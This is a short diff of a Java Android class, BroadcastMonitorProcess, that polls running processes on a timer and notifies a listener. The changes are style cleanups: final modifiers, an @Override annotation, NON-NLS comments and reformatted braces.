@@ -15,10 +15,10 @@ import com.android.service.util.Check;
 
 public class BroadcastMonitorProcess extends Thread {
 	/** The Constant TAG. */
-	private static final String TAG = "BroadcastMonitorProcess";
+	private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$
 
 	private boolean stop;
-	private int period;
+	private final int period;
 	RunningProcesses runningProcess;
 
 	private ListenerProcess listenerProcess;
@@ -29,6 +29,7 @@ public class BroadcastMonitorProcess extends Thread {
 		runningProcess = new RunningProcesses();
 	}
 
+	@Override
 	synchronized public void run() {
 		do {
 			if (stop) {
@@ -40,15 +41,17 @@ public class BroadcastMonitorProcess extends Thread {
 
 			try {
 				wait(period);
-			} catch (InterruptedException e) {
-				if(Cfg.DEBUG) { Check.log(e); }
+			} catch (final InterruptedException e) {
+				if (Cfg.DEBUG) {
+					Check.log(e) ;//$NON-NLS-1$
+				}
 			}
 		} while (true);
 	}
 
 	void register(ListenerProcess listenerProcess) {
 		stop = false;
-		this.listenerProcess=listenerProcess;
+		this.listenerProcess = listenerProcess;
 	}
 
 	synchronized void unregister() {
